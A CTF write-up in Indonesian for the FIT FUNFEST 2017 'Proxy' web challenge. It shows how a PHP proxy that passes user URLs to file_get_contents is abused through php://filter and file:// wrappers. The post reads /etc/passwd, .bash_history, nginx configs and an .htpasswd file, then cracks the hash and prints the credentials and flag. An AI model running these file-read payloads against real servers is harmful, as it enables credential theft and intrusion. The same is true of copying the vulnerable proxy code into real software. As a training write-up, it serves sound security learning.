---
layout: post
title: 'FIT FUNFEST 2017 : Proxy'
description: Writeup Proxy FIT FUNFEST CTF
modified: 2017-03-16
date: 2017-03-16
category: ctf
tags: [fitfunfest]
imagefeature: /images/fit-funfest.png
mathjax: false
chart: null
comments: true
featured: true
published: true
private: 'false'
---


### Soal

```
http://128.199.66.146:12121/proxy/
```

### Solusi

Diberikan website seperti layanan proxy kita bisa mengakses website lain melalui
layanan tersebut kemudian kita memanfaatkan Wrappers yang tidak di blacklist
untuk membaca file config dan menemukan folder secret yang di authentikasi
dengan Basic HTTP Authentication kami melakukan decrpyt password .htpasswd
yang di gunakan algoritma {SHA} kemudian kami mengauthentikasi dan
mendapatkan flag

Setelah melakukan analisa kepada layanan yang tersedia yaitu proxy untuk
membuka website di input field nya ada placeholder http atau https tapi ternyata ada beberapa wrappers yang masih bisa di gunakan karena tidak di disable atau di blacklist. Pertama kita bisa mendapatkan source code layanan proxy dalam base64 dan melakukan decode untuk membaca source code aslinya dengan command

`curl http://128.199.66.146:12121/proxy/?url=php://filter/convert.base64-encode/resource=index.php | base64 -d > index.php`

```php
<?php
error_reporting(0);
if (isset($_GET['url'])) {
$url = $_GET['url'];
if (filter_var($url, FILTER_VALIDATE_URL) === FALSE) {
die('Not a valid URL');
}
$content = file_get_contents($url);
die($content);
}
?>
<header>
<title>Proxy</title>
<link
href='http://fonts.googleapis.com/css?family=Open+Sans+Condensed:300'
rel='stylesheet' type='text/css'>
<style type="text/css">
.form-style-8{
font-family: 'Open Sans Condensed', arial, sans;
width: 500px;
padding: 30px;
background: #FFFFFF;
margin: 50px auto;
box-shadow: 0px 0px 15px rgba(0, 0, 0, 0.22);
-moz-box-shadow: 0px 0px 15px rgba(0, 0, 0, 0.22);
-webkit-box-shadow: 0px 0px 15px rgba(0, 0, 0, 0.22);
}
.form-style-8 h2{
background: #4D4D4D;
text-transform: uppercase;
font-family: 'Open Sans Condensed', sans-serif;
color: #797979;
font-size: 18px;
font-weight: 100;
padding: 20px;
margin: -30px -30px 30px -30px;}
.form-style-8 input[type="text"],
.form-style-8 input[type="date"],
.form-style-8 input[type="datetime"],
.form-style-8 input[type="email"],
.form-style-8 input[type="number"],
.form-style-8 input[type="search"],
.form-style-8 input[type="time"],
.form-style-8 input[type="url"],
.form-style-8 input[type="password"],
.form-style-8 textarea,
.form-style-8 select
{
box-sizing: border-box;
-webkit-box-sizing: border-box;
-moz-box-sizing: border-box;
outline: none;
display: block;
width: 100%;
padding: 7px;
border: none;
border-bottom: 1px solid #ddd;
background: transparent;
margin-bottom: 10px;
font: 16px Arial, Helvetica, sans-serif;
height: 45px;
}
.form-style-8 textarea{
resize:none;
overflow: hidden;
}
.form-style-8 input[type="button"],
.form-style-8 input[type="submit"]{
-moz-box-shadow: inset 0px 1px 0px 0px #45D6D6;
-webkit-box-shadow: inset 0px 1px 0px 0px #45D6D6;
box-shadow: inset 0px 1px 0px 0px #45D6D6;
background-color: #2CBBBB;
border: 1px solid #27A0A0;
display: inline-block;
cursor: pointer;
color: #FFFFFF;
font-family: 'Open Sans Condensed', sans-serif;font-size: 14px;
padding: 8px 18px;
text-decoration: none;
text-transform: uppercase;
}
.form-style-8 input[type="button"]:hover,
.form-style-8 input[type="submit"]:hover {
background:linear-gradient(to bottom, #34CACA 5%, #30C9C9 100%);
background-color:#34CACA;
}
</style>
</header>
<body>
<div class="form-style-8">
<h2>PROXY</h2>
<form>
<input type="text" name="url" placeholder="http:// or https://" />
</form>
</div>
</body>
```

Kurang lebih source code tersebut seperti di atas 

Kemudian kami mencoba mencari cara untuk mendapatkan Remote Code Injection
karena kami belum menemukan lokasi flag berada.
Kami juga mencoba membaca beberapa file berikut dengan wrappers file://

```
http://128.199.66.146:12121/proxy/index.php?url=file:///etc/passwd
http://128.199.66.146:12121/proxy/index.php?url=file:///home/web-x/.bash_history
http://128.199.66.146:12121/proxy/index.php?url=file:///etc/hosts
http://128.199.66.146:12121/proxy/index.php?url=file:///etc/nginx/sites-available/default
http://128.199.66.146:12121/proxy/index.php?url=file:///etc/nginx/sites-available/web-x
http://128.199.66.146:12121/proxy/index.php?url=file:///etc/nginx/sites-available/web-y
```

Pada file /etc/nginx/sites-available/default kami melihat ada directory rahasia yang di
proteksi dengan ​ HTTP Basic Authentication

```
location /secret_page_uksw/ {
try_files $uri $uri/ =404;
autoindex on;
auth_basic "Restricted Content";
auth_basic_user_file /etc/nginx/.htpasswd;
}
```

Kita baca file .htpasswd nya dengan url berikut

`http://128.199.66.146:12121/proxy/index.php?url=file:///etc/nginx/.htpasswd`

isinya seperti ini 

`fit-uksw:{SHA}NABfMvw51MY+i1z+THOgpy9oysc=`

![dectypt-sha1-htpasswd.png](/images/dectypt-sha1-htpasswd.png)


Kemudian kami crack password yang ada pada .htpasswd tersebut sehingga di
temukan plain text dari password adalah “indonesia45”
Selanjutnya kita cari di mana folder /secret_page_uksw/ berada pertama coba di
http://128.199.66.146:12121/secret_page_uksw/ namun masih not found, kami
coba baca lagi konfigurasi nginx nya ternyata port nya ngak di custom, dia
menggunakan port default yang terletak pada http://128.199.66.146/secret_page_uksw/ Kemudian kami masukan username danpassword untuk basic authentication **fit-uksw:indonesia45**

![secret-page-proxy-flag.png]({{site.baseurl}}/images/secret-page-proxy-flag.png)

**FIT2017{not_only_know_web_bug_but_also_server_config}**
